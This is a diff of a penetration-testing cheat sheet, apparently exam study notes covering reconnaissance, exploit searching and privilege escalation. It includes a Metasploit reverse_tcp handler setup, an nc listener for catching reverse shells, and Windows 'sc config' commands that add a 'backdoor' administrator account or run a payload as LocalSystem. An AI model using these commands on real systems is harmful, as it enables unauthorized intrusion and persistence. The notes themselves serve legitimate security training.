@@ -32,7 +32,7 @@ $ enum4linux [ target_ip ]	# Enumerate Windows / Samba (SMB) hosts.
 
 !! FOLLOW A PROCESS !!
 
-### DEEPER RECON (SERVICE-LEVEL) - WEBAPP EXAMPLE
+### RECON - WEBAPP
 
 Scripts:
 ```bash
@@ -66,6 +66,7 @@ $ searchsploit [options] [search_term1] [search_term2] . . . [search_termN]
 
 # Nmap Scripting ENgine
 $ ls -l /usr/share/nmap/scripts/*service_name*
+
 ```
 
 Other areas to find exploit code:
@@ -80,20 +81,15 @@ Using the public exploit you found + Metasploit Multi-Handler, you can establish
 
 Metasploit Handler usage w/ public exploit:
 ```bash
-# SETUP HANDLER
-$ msfconsole
 $ msf > use exploit/multi/handler
 $ msf exploit(handler) > set payload windows/meterpreter/reverse_tcp
-. . . 
-[*] Exploit running as background job 0.
-[*] Started reverse TCP handler on 10.11.0.31:443 
 ```
 
 Meterpreter sometimes doesn't work.
 Go back to using `nc -nvlp 80` and trigger reverse shell in vulnerable app/service.
 
 
-### PRIVILEGE ESCALATION - ENUM
+### PRIVILEGE ESCALATION
 
 Get a proper shell: https://netsec.ws/?p=337
 ```bash
@@ -105,14 +101,14 @@ General privesc guide:
 * https://www.reddit.com/r/oscp/comments/9ystub/i_absolutely_suck_at_privilege_escalation/?st=JOQAMPYP&sh=8899be73
 
 Linux privesc:
-* https://github.com/ankh2054/linux-pentest/blob/master/linuxprivchecker.py (automated)
+* https://github.com/ankh2054/linux-pentest/blob/master/linuxprivchecker.py (automated - suggests exploits)
 * https://github.com/rebootuser/LinEnum (automated)
 * https://tools.kali.org/vulnerability-analysis/unix-privesc-check (automated - Kali)
 * https://blog.g0tmi1k.com/2011/08/basic-linux-privilege-escalation/ (manual)
 
 Windows privesc:
-* Automated scanner: https://github.com/azmatt/windowsEnum
-* http://www.exumbraops.com/penetration-testing-102-windows-privilege-escalation-cheatsheet/
+* Automated scanner: https://github.com/azmatt/windowsEnum (automated)
+* http://www.exumbraops.com/penetration-testing-102-windows-privilege-escalation-cheatsheet/ (manual)
 * http://hackingandsecurity.blogspot.com/2017/09/oscp-windows-priviledge-escalation.html
 * https://github.com/netbiosX/Checklists/blob/master/Windows-Privilege-Escalation.md
 * Accesschk.exe: http://www.fuzzysecurity.com/tutorials/16.html
@@ -161,10 +157,6 @@ sc config <vuln-service> binpath= "net localgroup Administrators backdoor /add"
 sc config <vuln-service> binPath= "c:\inetpub\wwwroot\runmsf.exe" depend= "" start= demand obj= ".\LocalSystem" password= ""
 net start <vulnerable-service>
 ```
-
-Summarise possible attack vectors / vulnerable services to escalate privileges.
-
-
 
 ### EXPLOITS - USING / COMPILING
 
